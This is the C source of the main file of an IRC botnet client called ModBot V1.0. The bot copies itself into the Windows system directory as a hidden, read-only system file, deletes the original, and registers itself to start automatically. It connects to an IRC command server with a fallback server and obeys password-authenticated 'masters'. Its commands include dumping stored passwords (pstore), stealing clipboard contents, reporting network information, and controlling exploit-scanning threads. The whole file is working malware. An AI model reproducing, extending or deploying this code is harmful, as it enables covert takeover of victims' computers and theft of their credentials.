/////////////////////////////////////////////////
//              120|-[ModBot]-V1.0             //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Conf.h"
#include "Cmd.h"
#include "Glo.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////
char AIMmesg[512];
//////////////////////////////////////////////////////////////////////////////////
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_EHANDLER

	DWORD handler = (DWORD)_except_handler;
	_asm
    {                           
        push    handler         
        push    FS:[0]          
        mov     FS:[0],ESP      
    }
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	started = GetTickCount() / 1000;
	srand(GetTickCount());
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_LOGGING
	opendebuglog();
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_CRYPT 
	decryptstrings((sizeof(authost) / sizeof(LPTSTR)), (sizeof(versionlist) / sizeof(LPTSTR)));
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	LoadDLLs(); 

	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 60000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

//No SelfCopy added by iNs

#ifdef NO_SELFCOPY
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
#endif

#ifndef NO_SELFCOPY
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);
#endif

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; 
				Sleep(15000);
			} else
				break; 
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_CONSOLE
	OpenConsole();
	printf("Debugging console enabled.\n\n");
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MELT
	if (__argc > 2) {
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000);  
			DeleteFile(__argv[2]);
		}
	}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

        sprintf(logbuf,"%s Bot started", mn_title);
	addthread(logbuf,MAIN_THREAD,NULL);
	////addlog(logbuf);

	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();

    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_CONNCHECK
			DWORD cstat;
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2) 
				break; 

			if (success) i--; 

			Sleep(3000);
		}

		if (err == 2) break; 

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	killthreadall();
	fWSACleanup();

	return 0;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0) 
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
#endif
		//////addlogv("Connected to %s",irc.host);

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {	
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;	
	}
	clearthread(irc.threadnum);

	return rval;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
		"USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), nick1);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	while(1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;
		
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; 
			case -2:
				return 1; 
			case -3:
				return 2; 
			default:
				break;
			}
		}
	}

	return 0;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}
	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}
	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); 
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) 
			strncpy(host,  h+1, 159);
		return 1;
	}
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) 
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"%s User %s logged out",  mn_title, knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					////addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}
	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) 
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "%s User: %s logged out",  mn_title, user);
					////addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) 
			*in_channel = 1;
		//////addlogv("Joined channel: %s",a[4]);
		return 1;
	}

	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	
			if (strcmp("NOTICE", a[1]) == 0) 
				notice = TRUE;
			if (a[2] == NULL) return 1;
	
			if (strstr(a[2], "#") == NULL || notice) 
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0) 
					s = 4; 
				else 
					s = 3;
			if (a[s] == NULL) return 1;
			if (strcmp("\1VERSION\1", a[s]) == 0) 
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
					return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { 
			s = 4;
			a[4]++;
			a[2] = a[3];
		}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		if (a[s]++[0] != prefix) 
			return 1;
#ifdef DEBUG_CRYPT	
#ifndef NO_CRYPT
		if (strcmp("dump", a[s]) == 0) {
			if (a[s+1]) {
				irc_sendv(sock, "NOTICE %s : Id = '%s'\r\n",user,botid); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Version = '%s'\r\n",user,version); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Server = '%s'\r\n",user,server); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Channel = '%s'\r\n",user,channel); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Nickconst = '%s'\r\n",user,nickconst); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Authost = '%s'\r\n",user,authost[0]);
				irc_sendv(sock, "NOTICE %s : Password(before) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password(enc) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(a[s+1],strlen(a[s+1]));
				irc_sendv(sock, "NOTICE %s : Password(arg) = '%s'\r\n",user,a[s+1]); Sleep(FLOOD_DELAY);
			}

			return 1;
		}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#endif
		if (strcmp(login_cmd, a[s]) == 0) {
			if (a[s+1] == NULL || ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
#ifndef NO_CRYPT
			Crypt(a[s+1],strlen(a[s+1]),"",0); 
#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Pass auth failed (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "%s *Failed pass auth by: (%s!%s)",  mn_title, u, h);
				////addlog(sendbuf);
				return 1; 
			}
	
			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof(authost) / sizeof(LPTSTR));i++) {
#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) { 
					host_ok = TRUE;
					break;
				}
#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Host Auth failed (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
 				sprintf(sendbuf, "%s *Failed host auth by: (%s!%s)",  mn_title, u, h);
 				////addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "My Master", notice);
					//////addlogv("User: %s logged in", user);
					break;
				}
			}
			return 1;
		}
		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) 
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}
			if (a[s][0] == prefix || usevars) {
				replacestr(line, "$me", nick1); 
				replacestr(line, "$user", user); 
				replacestr(line, "$chan", a[2]); 
				replacestr(line, "$rndnick", rndnick(ntmp)); 
				replacestr(line, "$server", server); 

				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57) 
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) 
						ntmp2[0] = (char)atoi(ntmp); 
					else 
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) 
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL) 
					return 1;
				a[s] += 3;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			if (strcmp(randomnick_cmd, a[s]) == 0) {
				rndnick(nick, nicktype, ((parameters['p'])?(TRUE):(FALSE)), a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

				////addlogv("%s Random nick change: %s",mn_title,nick);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(die_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
#ifdef DEBUG_LOGGING
					closedebuglog();
#endif
					killthreadall();
					ExitProcess(EXIT_SUCCESS);
				}
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(logout_cmd, a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "%s User %s logged out.",  mn_title, masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "%s No user logged in at slot: %d",  mn_title, i);
					} else
						sprintf(sendbuf, "%s Invalid login slot number: %d",  mn_title, i);				
				} else {
					for (i = 0; i < MAXLOGINS; i++) 
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "%s User %s logged out",  mn_title, user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_BOTVERSION
			else if (strcmp(version_cmd, a[s]) == 0) {
				sprintf(sendbuf, "%s %s",  mn_title, version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp("pstore", a[s]) == 0 || strcmp ("ps", a[s]) == 0) {
				pststrct pStorInfo;
				pStorInfo.sock = sock;
				strcpy(pStorInfo.chan,a[2]);
				sprintf(sendbuf, "Executed pstore",  mn_title, version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);
				CreateThread(NULL, 0, &pstore, (LPVOID)&pStorInfo, 0, 0);
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_TFTPD
			else if (strcmp(tftpstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Server",TFTP_THREAD,a[s+1]);
				////addlog(sendbuf);
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(scanstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Scan",SCAN_THREAD,a[s+1]);
				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(scanstats_cmd, a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(reconnect_cmd, a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				////addlog("Reconnecting");

				return 0;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(disconnect_cmd, a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				////addlog("Disconnecting");

				return -1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(quit_cmd, a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else 
					irc_sendv(sock, "QUIT :later\r\n"); 

				return -2;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(status_cmd, a[s]) == 0) {
				sprintf(sendbuf, "%s Status: Ready. Bot Uptime: %s",  mn_title, Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(botid_cmd, a[s]) == 0) {
				sprintf(sendbuf, "%s Bot ID: %s",  mn_title, botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(threads_cmd, a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "List threads");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start list thread, error %d",  mn_title, GetLastError());
				//////addlog(sendbuf);
	
				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NETINFO
			else if (strcmp(netinfo_cmd, a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				////addlog("Network Info");

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(removebot_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "Removing Bot",notice);
#ifdef DEBUG_LOGGING
				closedebuglog();
#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(uptime_cmd, a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]); 
			   
				if (total/86400 >= uptime || uptime == -1) { 
					sprintf(sendbuf, "%s Uptime: %s", mn_title,Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					//////addlog(sendbuf);
				} 

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DUMP_ENCRYPT
			else if (strcmp(encrypt_cmd, a[s]) == 0) {
				encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

				return 1;
			}
#endif

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(who_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				//addlog("Login list complete");
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(getclipboard_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "", notice);
				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				//addlog("Get Clipboard");

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

